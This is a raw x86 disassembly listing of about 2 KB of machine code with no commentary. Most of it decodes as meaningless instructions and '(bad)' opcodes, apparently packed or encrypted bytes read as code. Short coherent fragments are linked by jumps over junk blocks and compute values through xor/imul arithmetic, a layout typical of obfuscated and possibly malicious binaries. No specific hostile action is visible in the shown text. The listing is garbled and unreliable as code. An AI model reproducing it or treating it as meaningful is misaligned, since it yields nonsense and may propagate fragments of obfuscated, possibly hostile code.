  411f2c:	add    BYTE PTR [edi-0x6d000000],bh
  411f32:	pop    esi
  411f33:	mov    ebp,0x9c275cc3
  411f38:	adc    DWORD PTR [edi+eiz*8+0x61],ecx
  411f3c:	scas   al,BYTE PTR es:[edi]
  411f3d:	pusha  
  411f3e:	idiv   DWORD PTR [ebp+0x25]
  411f41:	push   edi
  411f42:	inc    esp
  411f43:	push   es
  411f44:	xchg   ecx,eax
  411f45:	mov    dl,BYTE PTR [ecx+edi*8+0x29]
  411f49:	sub    eax,0x21870c0
  411f4e:	pop    ecx
  411f4f:	std    
  411f50:	rol    DWORD PTR [ecx],0xd1
  411f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f54:	fnstenv [edx-0x28]
  411f57:	xchg   ebp,eax
  411f58:	pop    ebx
  411f59:	loope  0x411f3c
  411f5b:	mov    bh,0x90
  411f5d:	pop    edi
  411f5e:	and    eax,DWORD PTR [ecx+0x23]
  411f61:	loop   0x411f34
  411f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f64:	ds js  0x411f58
  411f67:	mov    edx,ds
  411f69:	call   0xb777:0x37a391bd
  411f70:	and    al,BYTE PTR [esi]
  411f72:	adc    BYTE PTR [ebx+0x6fc73fec],bl
  411f78:	cmc    
  411f79:	xlat   BYTE PTR ds:[ebx]
  411f7a:	les    ebp,FWORD PTR [esi]
  411f7c:	jae    0x411fc1
  411f7e:	push   ds
  411f7f:	add    bl,ah
  411f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f82:	add    esp,DWORD PTR [edi-0x5f797775]
  411f88:	cmp    esi,DWORD PTR [eax+0x33e9496f]
  411f8e:	dec    eax
  411f8f:	fwait
  411f90:	add    ebx,DWORD PTR [ebp-0xdd01658]
  411f96:	mov    esp,0x3e8cead7
  411f9b:	test   al,0x8b
  411f9d:	sahf   
  411f9e:	mov    eax,ds:0x36061cb3
  411fa3:	jmp    0x1176:0x4287b1ad
  411faa:	int3   
  411fab:	mov    eax,ds:0x529ed139
  411fb0:	nop
  411fb1:	sbb    bh,bl
  411fb3:	jb     0x411f9d
  411fb5:	fadd   st(0),st
  411fb7:	push   0xfffffffb
  411fb9:	jb     0x411fc0
  411fbb:	(bad)  
  411fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fbd:	pushf  
  411fbe:	jae    0x412011
  411fc0:	or     BYTE PTR [edi+0x6d],0x26
  411fc4:	stos   DWORD PTR es:[edi],eax
  411fc5:	fs pusha 
  411fc7:	fiadd  DWORD PTR [ebp+0x6c]
  411fca:	clc    
  411fcb:	fs pop es
  411fcd:	out    dx,al
  411fce:	daa    
  411fcf:	loope  0x411fc7
  411fd1:	jo     0x411fde
  411fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fd4:	mov    ds:0x677bf72f,eax
  411fd9:	mov    dl,0x53
  411fdb:	(bad)  
  411fdc:	fisubr WORD PTR [esi]
  411fde:	jge    0x41201c
  411fe0:	xor    esp,ebx
  411fe2:	mov    dh,0x4d
  411fe4:	and    al,0xde
  411fe6:	mul    BYTE PTR [eax+0x3ed51413]
  411fec:	xor    DWORD PTR [edx],0xffffffd2
  411fef:	jl     0x411ff4
  411ff1:	enter  0x458b,0x8
  411ff5:	lea    eax,[ecx+eax*1-0x24bd751d]
  411ffc:	jmp    0x4120d8
  412001:	and    BYTE PTR [eax-0x59],al
  412004:	jo     0x411fed
  412006:	div    edi
  412008:	push   eax
  412009:	lods   eax,DWORD PTR ds:[esi]
  41200a:	out    0x35,al
  41200c:	mov    DWORD PTR [edi],0x614e3d08
  412012:	mov    BYTE PTR [eax],0x0
  412015:	mov    edi,0x51000000
  41201a:	(bad)  
  41201b:	shl    BYTE PTR [ebx+0x2572b981],0x6c
  412022:	retf   
  412023:	(bad)  
  412024:	(bad)  
  412025:	or     al,0x86
  412027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412028:	ins    BYTE PTR es:[edi],dx
  412029:	mov    ss,esi
  41202b:	lea    eax,[edi+0x5b9f3e6a]
  412031:	call   0x793307b4
  412036:	sbb    eax,0xa0ede79c
  41203b:	lahf   
  41203c:	sub    edi,DWORD PTR [edx+0x3ee3d921]
  412042:	push   cs
  412043:	push   ecx
  412044:	mov    ?,WORD PTR [eax+0x4a]
  412047:	mov    ds:0x4bcbcacc,eax
  41204c:	sbb    al,0xcc
  41204e:	push   ebx
  41204f:	das    
  412050:	cmp    BYTE PTR [edi+0x4f167fcb],0x53
  412057:	das    
  412058:	pop    ebx
  412059:	mov    al,ds:0x6869ff59
  41205e:	jne    0x411ffa
  412060:	mov    al,0xe9
  412062:	push   edx
  412063:	fstp   TBYTE PTR [edi-0x64]
  412066:	xlat   BYTE PTR ds:[ebx]
  412067:	jp     0x4120ac
  412069:	out    0x55,eax
  41206b:	stos   DWORD PTR es:[edi],eax
  41206c:	inc    ebp
  41206d:	mov    ds:0x7c107810,eax
  412072:	(bad)  
  412073:	shl    edx,cl
  412075:	cmp    BYTE PTR [eax+0x34],cl
  412078:	call   0xba88:0xdecee1eb
  41207f:	out    dx,al
  412080:	call   0x57a1:0xbeda80db
  412087:	int3   
  412088:	fcom   QWORD PTR [eax-0x65]
  41208b:	outs   dx,DWORD PTR ds:[esi]
  41208c:	ret    0x2f53
  41208f:	jle    0x4120db
  412091:	or     al,0xcf
  412093:	pop    eax
  412094:	push   ebp
  412095:	mov    al,0xfa
  412097:	fisub  DWORD PTR [ecx]
  412099:	test   al,0xd4
  41209b:	inc    esi
  41209c:	or     DWORD PTR [ecx+0x536b8090],0x93d1262b
  4120a6:	sub    eax,0x80d554e9
  4120ab:	xor    al,0xa3
  4120ad:	ficomp DWORD PTR [esi]
  4120af:	ja     0x41204d
  4120b1:	xor    ebx,DWORD PTR [edx]
  4120b3:	aaa    
  4120b4:	pop    ebx
  4120b5:	out    0x82,eax
  4120b7:	cmp    DWORD PTR [ecx+0x5f],esp
  4120ba:	pop    ebx
  4120bb:	fsub   QWORD PTR ds:0xe07355be
  4120c1:	mov    ah,0xa6
  4120c3:	cmp    al,BYTE PTR [ecx*8-0x48665c61]
  4120ca:	sbb    ecx,DWORD PTR [edi]
  4120cc:	mov    ch,0x1c
  4120ce:	int3   
  4120cf:	push   0xc355fd33
  4120d4:	mov    fs,WORD PTR [ebp-0x10]
  4120d7:	out    dx,al
  4120d8:	mov    DWORD PTR [ebp-0x24],eax
  4120db:	jmp    0x4121b7
  4120e0:	push   ebp
  4120e1:	inc    ebp
  4120e2:	or     eax,0xd5d81d98
  4120e7:	int    0x84
  4120e9:	add    DWORD PTR [esp+ebx*1],ebx
  4120ec:	sbb    bh,BYTE PTR [eax+edi*8+0xc72069]
  4120f3:	add    BYTE PTR [edi-0x3000000],bh
  4120f9:	mov    DWORD PTR [ecx+0x11fd96fc],edi
  4120ff:	dec    ebp
  412100:	mov    dl,BYTE PTR [bp+di-0x2e80]
  412105:	adc    al,0x33
  412107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412108:	pop    esi
  412109:	and    BYTE PTR [edi-0x6a282fbe],dl
  41210f:	jl     0x412099
  412111:	push   ds
  412112:	out    0xde,eax
  412114:	daa    
  412115:	enter  0xed70,0xa1
  412119:	adc    dh,dh
  41211b:	push   ebx
  41211c:	mov    ebp,0xb9ff302f
  412121:	sub    bl,ah
  412123:	loop   0x412143
  412125:	jbe    0x4120f9
  412127:	out    0x37,al
  412129:	dec    ecx
  41212a:	sbb    eax,0xa4b02bd2
  41212f:	mov    BYTE PTR [edi-0x1050933e],cl
  412135:	dec    ecx
  412136:	jno    0x4120dc
  412138:	push   cs
  412139:	xor    al,0x77
  41213b:	pushf  
  41213c:	mov    ebp,0x6c017ab
  412141:	xor    DWORD PTR [edx-0x79],0x3f
  412145:	mov    dh,0xb6
  412147:	sti    
  412148:	and    al,0x9b
  41214a:	ins    DWORD PTR es:[edi],dx
  41214b:	add    al,0xfb
  41214d:	mov    al,ds:0x6400ec02
  412152:	adc    al,0xc0
  412154:	icebp  
  412155:	jnp    0x4121d6
  412157:	mov    ebx,0x4ac15a31
  41215c:	rcl    BYTE PTR [edi],0xb4
  41215f:	lods   eax,DWORD PTR ds:[esi]
  412160:	push   0x20
  412162:	and    ecx,esi
  412164:	js     0x4120e6
  412166:	bound  ecx,QWORD PTR [eax+esi*8-0x7262aef]
  41216d:	jg     0x4121b0
  41216f:	bound  ebp,QWORD PTR [esi-0x391b7781]
  412175:	or     esp,edx
  412177:	mov    bh,dh
  412179:	dec    ebx
  41217a:	fisttp WORD PTR [edi-0x5df773bc]
  412180:	pop    DWORD PTR [ecx]
  412182:	mov    ds:0xff9adf0b,al
  412187:	gs (bad) 
  41218a:	jmp    0x7b88f039
  41218f:	(bad)  
  412190:	xor    BYTE PTR [eax-0x1],dh
  412193:	shr    dh,1
  412195:	mov    ds:0xce1260d6,al
  41219a:	mov    ebx,0x6edfece6
  41219f:	call   FWORD PTR [edx-0x36]
  4121a2:	pushf  
  4121a3:	in     al,0x18
  4121a5:	sub    DWORD PTR [esi+0x3a],ebx
  4121a8:	mov    BYTE PTR [eax-0x66],ch
  4121ab:	adc    ch,0x23
  4121ae:	test   DWORD PTR [esi+0x67],esp
  4121b1:	push   edx
  4121b2:	fiadd  DWORD PTR [ebx]
  4121b4:	fstp   st(4)
  4121b6:	stos   BYTE PTR es:[edi],al
  4121b7:	mov    DWORD PTR [ebp-0x2c],0x6944
  4121be:	mov    DWORD PTR [ebp-0x34],0x316a
  4121c5:	mov    DWORD PTR [ebp-0x3c],0xfb1
  4121cc:	mov    DWORD PTR [ebp-0x40],0x797b
  4121d3:	mov    DWORD PTR [ebp-0x44],0xb97
  4121da:	mov    DWORD PTR [ebp-0x48],0x6b06
  4121e1:	mov    ecx,DWORD PTR [ebp-0x48]
  4121e4:	and    ecx,0x2442
  4121ea:	mov    eax,0x2002
  4121ef:	sub    eax,ecx
  4121f1:	mov    ecx,DWORD PTR [ebp-0x44]
  4121f4:	jmp    0x4122d0
  4121f9:	dec    esp
  4121fa:	adc    DWORD PTR [edx],edx
  4121fc:	icebp  
  4121fd:	pop    edi
  4121fe:	repz out dx,eax
  412200:	mov    ebp,0x707c7b48
  412205:	xchg   esp,eax
  412206:	or     BYTE PTR [esi+0xc7dfa4],0x0
  41220d:	mov    edi,0x22000000
  412212:	xchg   ecx,eax
  412213:	xlat   BYTE PTR ds:[ebx]
  412214:	ret    
  412215:	pop    ss
  412216:	(bad)  
  412217:	fidivr WORD PTR [ecx+edx*8+0x4b477256]
  41221e:	aam    0xe
  412220:	(bad)  
  412221:	imul   ebp,DWORD PTR [eax+eax*1],0x68cf8527
  412228:	les    edx,FWORD PTR [edx+0x61]
  41222b:	jl     0x412254
  41222d:	and    BYTE PTR [ebp-0x79],0x21
  412231:	push   ebp
  412232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412233:	or     al,BYTE PTR [ecx+0x62]
  412236:	mov    ecx,0xcc018e32
  41223b:	pop    edi
  41223c:	and    eax,DWORD PTR [eax-0x3aee2f8e]
  412242:	sar    ebx,0x22
  412245:	cld    
  412246:	cmp    al,0x45
  412248:	sub    eax,0x8c68aec7
  41224d:	fdivr  st,st(6)
  41224f:	pop    ecx
  412250:	mov    eax,0x53c8f185
  412255:	or     cl,BYTE PTR [esi]
  412257:	fadd   QWORD PTR [edi]
  412259:	sub    BYTE PTR [eax],dl
  41225b:	mov    ebx,0xccb0bdfe
  412260:	out    dx,al
  412261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412262:	push   ebp
  412263:	adc    BYTE PTR [eax+0x7f],cl
  412266:	sbb    ebp,ebp
  412268:	je     0x4122b2
  41226a:	in     al,dx
  41226b:	push   ebx
  41226c:	sbb    edx,DWORD PTR [eax+0x73]
  41226f:	cmp    DWORD PTR [edi],esi
  412271:	xchg   BYTE PTR [eax+0x65000835],dl
  412277:	or     ch,bl
  412279:	pop    edi
  41227a:	not    edi
  41227c:	dec    esp
  41227d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41227e:	iret   
  41227f:	or     al,0x6a
  412281:	outs   dx,BYTE PTR ds:[esi]
  412282:	xchg   esp,eax
  412283:	addr16 fs dec ebp
  412286:	fistp  QWORD PTR [edi]
  412288:	jae    0x4122a0
  41228a:	inc    esi
  41228b:	mov    bl,0xf7
  41228d:	cli    
  41228e:	push   cs
  41228f:	mov    eax,ds:0xae17941e
  412294:	jae    0x412303
  412296:	adc    dl,ah
  412298:	jle    0x4122e9
  41229a:	stos   BYTE PTR es:[edi],al
  41229b:	ins    BYTE PTR es:[edi],dx
  41229c:	xchg   esp,eax
  41229d:	enter  0x3438,0xa9
  4122a1:	jmp    0x761d:0x696f1c30
  4122a8:	or     eax,DWORD PTR [ebp-0x42a235da]
  4122ae:	ins    DWORD PTR es:[edi],dx
  4122af:	mov    DWORD PTR [eax-0x62],edx
  4122b2:	mov    bl,0xbe
  4122b4:	jmp    0x4122e0
  4122b6:	in     eax,0x7b
  4122b8:	mov    ah,0x70
  4122ba:	sub    eax,0x77650124
  4122bf:	or     cl,bl
  4122c1:	xor    BYTE PTR [esi],cl
  4122c3:	aam    0x19
  4122c5:	ficom  DWORD PTR [eax-0x27586f51]
  4122cb:	jp     0x4122f6
  4122cd:	out    dx,eax
  4122ce:	stos   BYTE PTR es:[edi],al
  4122cf:	xchg   ebx,eax
  4122d0:	imul   eax,eax,0x48d9
  4122d6:	mov    edx,DWORD PTR [ebp-0x40]
  4122d9:	shr    ecx,0x2
  4122dc:	jmp    0x4123b8
  4122e1:	mov    esp,0xfb7d6b6d
  4122e6:	jg     0x4122a6
  4122e8:	in     eax,dx
  4122e9:	adc    DWORD PTR [esi-0x1fae9a61],edx
  4122ef:	lds    esi,FWORD PTR [ebx]
  4122f1:	sahf   
  4122f2:	enter  0x0,0xbf
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	add    BYTE PTR [edx],bh
  4122fa:	mov    ch,ch
  4122fc:	gs push 0x4e8eed22
  412302:	lock sbb al,0x87
  412305:	clc    
  412306:	fidivr DWORD PTR [ebx+0xf]
  412309:	jno    0x4122b7
  41230b:	pop    ds
  41230c:	xchg   ebp,eax
  41230d:	int3   
  41230e:	jb     0x412291
  412310:	aas    
  412311:	ja     0x4122b1
  412313:	fld    QWORD PTR [edx-0x38]
  412316:	pop    edx
  412317:	jge    0x4122db
  412319:	fisttp QWORD PTR [ebp-0x61b62c4b]
  41231f:	inc    ebx
  412320:	xchg   esi,eax
  412321:	stos   BYTE PTR es:[edi],al
  412322:	stos   BYTE PTR es:[edi],al
  412323:	ins    BYTE PTR es:[edi],dx
  412324:	int    0xd4
  412326:	ret    0x70f6
  412329:	pop    eax
  41232a:	scas   al,BYTE PTR es:[edi]
  41232b:	enter  0xe09c,0x63
  41232f:	mov    bh,0x9f
  412331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412332:	cmc    
  412333:	sti    
  412334:	out    dx,al
  412335:	popa   
  412336:	ss sub ch,ah
  412339:	out    0x25,eax
  41233b:	jae    0x412358
  41233d:	pop    es
  41233e:	sub    al,0x5b
  412340:	or     ebp,ebp
  412342:	stos   BYTE PTR es:[edi],al
  412343:	int    0x89
  412345:	(bad)  
  412346:	int3   
  412347:	jb     0x412395
  412349:	(bad)  
  41234b:	int3   
  41234c:	or     DWORD PTR [ebx+0x1facd83b],ebp
  412352:	xchg   BYTE PTR [ebp+esi*8+0x17],bh
  412356:	fstp   st(6)
  412358:	aaa    
  412359:	imul   eax,DWORD PTR [ebp+ebx*1-0x6b],0xffffffc2
  41235e:	jle    0x412338
  412360:	loopne 0x412319
  412362:	add    edx,DWORD PTR [ebx-0x53]
  412365:	lods   eax,DWORD PTR ds:[esi]
  412366:	and    ecx,DWORD PTR [ebx]
  412368:	sub    eax,0x11ac1030
  41236d:	or     ecx,DWORD PTR [bp+si]
  412370:	mov    ebx,0x9bd56ed4
  412375:	mov    ecx,0xe2fa1d69
  41237a:	or     dh,BYTE PTR [ecx-0x44]
  41237d:	retf   0xf4f0
  412380:	and    bl,BYTE PTR [edx-0x62071620]
  412386:	or     BYTE PTR [edi-0x41b5b780],dh
  41238c:	pop    ds
  41238d:	adc    ah,BYTE PTR [esi-0xc290d9d]
  412393:	mov    al,ds:0x2f60fe6e
  412398:	sbb    DWORD PTR [eax+0x3c],ebx
  41239b:	je     0x41236c
  41239d:	(bad)  
  41239e:	xor    DWORD PTR [edx-0x283dd905],esi
  4123a4:	in     al,0x9f
  4123a6:	iret   
  4123a7:	cs and DWORD PTR es:[esi+0x20a5cdab],0x33cbc522
  4123b3:	in     eax,0xc9
  4123b5:	pop    eax
  4123b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123b7:	in     al,dx
  4123b8:	imul   ecx,ecx,0x27d
  4123be:	or     ecx,edx
  4123c0:	jmp    0x41249c
  4123c5:	inc    esi
  4123c6:	inc    ebp
  4123c7:	shl    BYTE PTR [ecx],1
  4123c9:	shl    DWORD PTR [ebp+0x3e4377e7],cl
  4123cf:	popf   
  4123d0:	ins    DWORD PTR es:[edi],dx
  4123d1:	pushf  
  4123d2:	mov    al,ds:0xc95d334d
  4123d7:	add    BYTE PTR [eax],al
  4123d9:	mov    edi,0x4e000000
  4123de:	outs   dx,DWORD PTR ds:[esi]
  4123df:	jl     0x4123ba
  4123e1:	mov    ch,0x1a
  4123e3:	dec    ebx
  4123e4:	popa   
  4123e5:	shl    ah,0x92
  4123e8:	mov    ecx,0xd6611806
  4123ed:	mov    DWORD PTR [edx+0x51dea064],ecx
  4123f3:	div    DWORD PTR [eax+0x19]
  4123f6:	pop    edx
  4123f7:	sub    ah,BYTE PTR [edx-0x4f7f40fc]
  4123fd:	sti    
  4123fe:	add    ebx,edi
  412400:	stos   BYTE PTR es:[edi],al
  412401:	cmp    ebp,DWORD PTR [ecx+0x75]
  412404:	jbe    0x412458
  412406:	das    
  412407:	mov    al,ah
  412409:	pop    ss
  41240a:	std    
  41240b:	mov    bl,0xc6
  41240e:	mov    ebp,0x7cbaf451
  412413:	imul   BYTE PTR [eax-0x33bb1efe]
  412419:	push   ebp
  41241a:	dec    esp
  41241b:	test   al,0x44
  41241d:	ja     0x412468
  41241f:	and    cl,0xbf
  412422:	and    eax,0xab7d38f1
  412427:	and    al,0x3b
  412429:	out    0x85,eax
  41242b:	scas   eax,DWORD PTR es:[edi]
  41242c:	dec    eax
  41242d:	dec    edx
  41242e:	stc    
  41242f:	lahf   
  412430:	ins    BYTE PTR es:[edi],dx
  412431:	pop    edx
  412432:	scas   eax,DWORD PTR es:[edi]
  412433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412434:	mov    dh,0xbf
  412436:	inc    eax
  412437:	inc    eax
  412438:	dec    esi
  412439:	rcl    DWORD PTR [esp],0x48
  41243d:	outs   dx,DWORD PTR ds:[esi]
  41243e:	std    
  41243f:	xor    al,0x27
  412441:	mov    eax,0x269de156
  412446:	jns    0x41248c
  412448:	inc    edx
  412449:	sbb    edx,DWORD PTR [ebp+ecx*2-0x5b351ee6]
  412450:	push   esi
  412451:	jge    0x4124c2
  412453:	pop    ebp
  412454:	out    0x5e,al
  412456:	push   esi
  412457:	mov    ebx,0xcbacffae
  41245c:	cs adc eax,0xf53336b7
  412462:	ret    
  412463:	ja     0x412417
  412465:	or     esi,DWORD PTR [ebx+edi*1]
  412468:	hlt    
  412469:	leave  
  41246a:	push   ebp
  41246b:	adc    ch,BYTE PTR [eax-0x3f545ec]
  412471:	repz fld TBYTE PTR [esi-0x2f]
  412475:	pop    eax
  412476:	and    bh,BYTE PTR [eax-0x61]
  412479:	aas    
  41247a:	pop    es
  41247b:	scas   eax,DWORD PTR es:[edi]
  41247c:	sub    al,0x53
  41247e:	mov    ebp,0xb369fe00
  412483:	pop    ebp
  412484:	push   eax
  412485:	nop
  412486:	and    cl,BYTE PTR [edi+0x79a7d3d8]
  41248c:	test   BYTE PTR [eax+0x6],ah
  41248f:	mov    ch,0x9e
  412491:	stos   DWORD PTR es:[edi],eax
  412492:	mov    ebp,0x2b967518
  412497:	shr    DWORD PTR [edx],cl
  412499:	in     eax,0x8e
  41249b:	push   ebp
  41249c:	mov    edx,DWORD PTR [ebp-0x4]
  41249f:	xor    ecx,0x4992
  4124a5:	imul   ecx,ecx,0x2e84
  4124ab:	xor    ecx,0x4ec4dc24
  4124b1:	add    eax,DWORD PTR [ecx+edx*1+0x1c]
  4124b5:	mov    ecx,DWORD PTR [ebp-0x3c]
  4124b8:	mov    edx,DWORD PTR [ebp-0x34]
  4124bb:	and    ecx,0x1db
  4124c1:	imul   ecx,edx
  4124c4:	mov    edx,DWORD PTR [ebp-0x2c]
  4124c7:	sub    ecx,edx
  4124c9:	xor    ecx,0x4cfdc6
  4124cf:	add    ecx,eax
  4124d1:	add    ecx,DWORD PTR [ebp+0x8]
  4124d4:	xor    edi,edi
  4124d6:	mov    DWORD PTR [ebp-0x28],ecx
  4124d9:	mov    eax,DWORD PTR [ebp-0x4]
  4124dc:	jmp    0x4125b8
  4124e1:	push   ds
  4124e2:	pop    esp
  4124e3:	inc    esp
  4124e4:	test   eax,0xffffb946
  4124e9:	inc    edx
  4124ea:	out    0x58,eax
  4124ec:	mov    eax,ds:0x953b9530
  4124f1:	sbb    al,0xca
  4124f3:	add    BYTE PTR [eax],al
  4124f5:	mov    edi,0x58000000
  4124fa:	repz mov ebp,0x52a80ba6
  412500:	dec    ebx
  412501:	add    ah,BYTE PTR [ebp+0x64e73fb9]
  412507:	push   cs
  412508:	popa   
  412509:	das    
  41250a:	mov    ch,0x26
  41250c:	repnz test al,0xd8
  41250f:	sbb    DWORD PTR [ebx-0x70c24155],ebp
  412515:	daa    
  412516:	aaa    
  412517:	jge    0x412563
  412519:	inc    edx
  41251a:	xchg   edi,eax
  41251b:	mov    esp,0x35d0c9c
  412520:	in     eax,0x92
  412522:	adc    edx,eax
  412524:	and    eax,0x8cbc2c7c
  412529:	and    BYTE PTR [ebx+0x6f],ch
  41252c:	int    0x3c
  41252e:	and    eax,0x2181497c
  412533:	lds    ecx,FWORD PTR [edx]
  412535:	xor    ebp,DWORD PTR ds:0x9ecc8e41
  41253b:	and    al,0xd6
  41253d:	or     ch,cl
  41253f:	test   BYTE PTR [ecx],al
  412541:	fbstp  TBYTE PTR ds:0xf334c26f
  412547:	call   0xdfd5:0x132df1a9
  41254e:	inc    edi
  41254f:	mov    eax,ds:0x89b2f336
  412554:	inc    ebp
  412555:	inc    esp
  412556:	xchg   di,ax
  412558:	jmp    0x412567
  41255a:	cmp    ebp,DWORD PTR [ebx-0x5fe17415]
  412560:	repz icebp 
  412562:	push   es
  412563:	add    DWORD PTR [ebp+0x4843de2],edi
  412569:	inc    edx
  41256a:	nop
  41256b:	pop    esi
  41256c:	mov    ch,0xac
  41256e:	and    eax,0x4a0a2076
  412573:	mov    dl,0xc6
  412575:	mov    edi,0x834a8522
  41257a:	cld    
  41257b:	fisub  WORD PTR [esi-0x65]
  41257e:	xchg   DWORD PTR [eax+0x3a3b191a],esp
  412584:	(bad)  
  412585:	ins    DWORD PTR es:[edi],dx
  412586:	ffree  st(0)
  412588:	test   eax,0xf023381f
  41258d:	ja     0x412533
  41258f:	stos   DWORD PTR es:[edi],eax
  412590:	(bad)  
  412592:	cmp    BYTE PTR [ecx+0x7ef8b82],0xa6
  412599:	addr16 pop esp
  41259b:	adc    DWORD PTR [ebp+0x410218d4],0xffffffa2
  4125a2:	jl     0x412540
  4125a4:	jp     0x4125db
  4125a6:	bound  ecx,QWORD PTR [eax*4+0x4f0a6a51]
  4125ad:	jp     0x41262d
  4125af:	test   eax,0x67a55147
  4125b4:	je     0x4125ec
  4125b6:	shl    BYTE PTR [eax],1
  4125b8:	xor    esi,esi
  4125ba:	cmp    DWORD PTR [eax+0x18],edi
  4125bd:	jmp    0x412699
  4125c2:	adc    edi,DWORD PTR [ebx]
  4125c4:	jle    0x412588
  4125c6:	jle    0x41258f
  4125c8:	mov    edi,0x5c162cfb
  4125cd:	adc    DWORD PTR [ebp+0x50],esp
  4125d0:	shl    BYTE PTR [ebx],cl
  4125d2:	fcmovne st,st(2)
  4125d4:	add    BYTE PTR [eax],al
  4125d6:	mov    edi,0x6000000
  4125db:	cmp    BYTE PTR [esi-0x43],bl
  4125de:	int    0x52
  4125e0:	mov    al,0xdb
  4125e2:	jb     0x412580
  4125e4:	dec    esi
  4125e5:	xor    BYTE PTR [esi],al
  4125e7:	cld    
  4125e8:	mov    eax,ds:0xf2d390ac
  4125ed:	cwde   
  4125ee:	xchg   edx,eax
  4125ef:	xchg   DWORD PTR [edi+edi*1],ebx
  4125f2:	fldcw  WORD PTR ds:0x935ff369
  4125f8:	out    dx,eax
  4125f9:	add    eax,0x1e00641c
  4125fe:	call   0x60736c5b
  412603:	repnz fadd DWORD PTR [ebp+0x7b0862e2]
  41260a:	and    dh,BYTE PTR [ebp+edx*4+0x73]
  41260e:	pop    ebp
  41260f:	pop    eax
  412610:	loopne 0x41264b
  412612:	pop    es
  412613:	shl    BYTE PTR [eax],1
  412615:	mov    al,0x33
  412617:	sahf   
  412618:	jo     0x41262b
  41261a:	and    bh,dl
  41261c:	mov    bh,0x31
  41261e:	push   cs
  41261f:	mov    BYTE PTR [ecx+0x48],ch
  412622:	enter  0xca78,0x8
  412626:	add    ch,0xa3
  412629:	mov    ebp,0x6a849b70
  41262e:	nop
  41262f:	ror    BYTE PTR [esi],0x3a
  412632:	jl     0x412690
  412634:	adc    edx,ebx
  412636:	pop    ds
  412637:	push   edi
  412638:	sbb    eax,esi
  41263a:	loope  0x4125d8
  41263c:	pop    ecx
  41263d:	js     0x4125e6
  41263f:	sub    al,0x6a
  412641:	pop    ds
  412642:	adc    esi,edx
  412644:	xor    dl,BYTE PTR [eax]
  412646:	jecxz  0x412694
  412648:	mov    cl,0xca
  41264a:	data16 jno 0x412610
  41264d:	in     al,dx
  41264e:	in     al,0x22
  412650:	sbb    al,0xfb
  412652:	mov    ?,WORD PTR fs:[edi]
  412655:	sbb    BYTE PTR [ecx],ah
  412657:	mov    cl,0x1e
  412659:	push   cs
  41265a:	fnstsw WORD PTR [ecx+0x3a]
  41265d:	cs rcl ah,0x42
  412661:	fbstp  TBYTE PTR [ecx+0x57]
  412664:	mov    al,0x5
  412666:	push   edx
  412667:	nop    ecx
  41266a:	mov    ds:0xa20f148f,al
  41266f:	out    dx,al
  412670:	iret   
  412671:	mov    esp,0x95b31be4
  412676:	lods   eax,DWORD PTR ds:[esi]
  412677:	cmpxchg DWORD PTR [edx-0x57],ebp
  41267b:	mov    BYTE PTR [ecx-0x36],al
  41267e:	ud0    ebx,DWORD PTR [edx+0x59]
  412682:	inc    esi
  412683:	rcl    ebx,1
  412685:	pop    ss
  412686:	cmp    al,BYTE PTR ds:0xccc240f8
  41268c:	xor    edx,DWORD PTR [edi-0x4f]
  41268f:	xchg   esi,eax
  412690:	and    eax,0x7de6ad0d
  412695:	icebp  
  412696:	mov    DWORD PTR [ebp-0x7bf087],eax
  41269c:	add    DWORD PTR [eax],eax
  41269e:	add    BYTE PTR [ebx-0x28161bbb],cl
  4126a4:	add    BYTE PTR [eax],al
  4126a6:	add    BYTE PTR [eax+esi*2],al
  4126a9:	mov    dl,0xdf
  4126ab:	neg    bh
  4126ad:	ins    DWORD PTR es:[edi],dx
  4126ae:	sti    
  4126af:	(bad)  
  4126b0:	scas   eax,DWORD PTR es:[edi]
  4126b1:	cmp    DWORD PTR [ebx-0x2145b0a6],0xcb9a
  4126bb:	mov    edi,0x47000000
  4126c0:	cdq    
  4126c1:	jle    0x412697
  4126c3:	jecxz  0x412655
  4126c5:	jnp    0x4126df
  4126c7:	out    0xc4,eax
  4126c9:	mov    bh,bl
  4126cb:	push   ss
  4126cc:	sub    BYTE PTR [edx-0x4c3f8c3b],bl
  4126d2:	clc    
  4126d3:	fs out dx,eax
  4126d5:	iret   
  4126d6:	jne    0x412751
  4126d8:	push   0xffffffeb
  4126da:	imul   esi,edi,0xffffffc6
  4126dd:	jle    0x412690
  4126df:	jl     0x412732
  4126e1:	push   ecx
  4126e2:	mov    WORD PTR [ecx+0x3e],?
  4126e5:	push   ds
  4126e6:	stc    
  4126e7:	sub    BYTE PTR [edx],0x20
  4126ea:	ja     0x4126da
  4126ec:	dec    edx
  4126ed:	jne    0x41267d
  4126ef:	mov    ds:0x8b7357c,eax
  4126f4:	imul   esp,DWORD PTR [eax],0x3c8a9142
  4126fa:	jnp    0x4126a3
  4126fc:	jle    0x41275d
  4126fe:	cld    
  4126ff:	mov    WORD PTR [ebx-0x619652be],?
  412705:	push   ebp
  412706:	mov    cl,0x5
  412708:	mov    esi,0x1b3eb321
  41270d:	pushf  
  41270e:	inc    DWORD PTR [edi]
  412710:	sahf   
  412711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412712:	add    al,0x4e
  412714:	out    dx,al
  412715:	call   0x1532:0xbb955d50
  41271c:	xchg   ebp,eax
  41271d:	mov    cx,0x22de
  412721:	mov    ecx,DWORD PTR [ebp+0x45]
  412724:	je     0x4126e4
  412726:	dec    DWORD PTR [edi-0x3caf6324]
  41272c:	gs adc esi,ebx
  41272f:	fadd   st,st(6)
  412731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412732:	inc    esp
  412733:	iret   
  412734:	fidivr DWORD PTR [edx-0x48]
  412737:	dec    ebp
  412738:	mov    dl,0x42
  41273a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41273b:	dec    esi
  41273c:	push   cs
  41273d:	outs   dx,BYTE PTR ds:[esi]
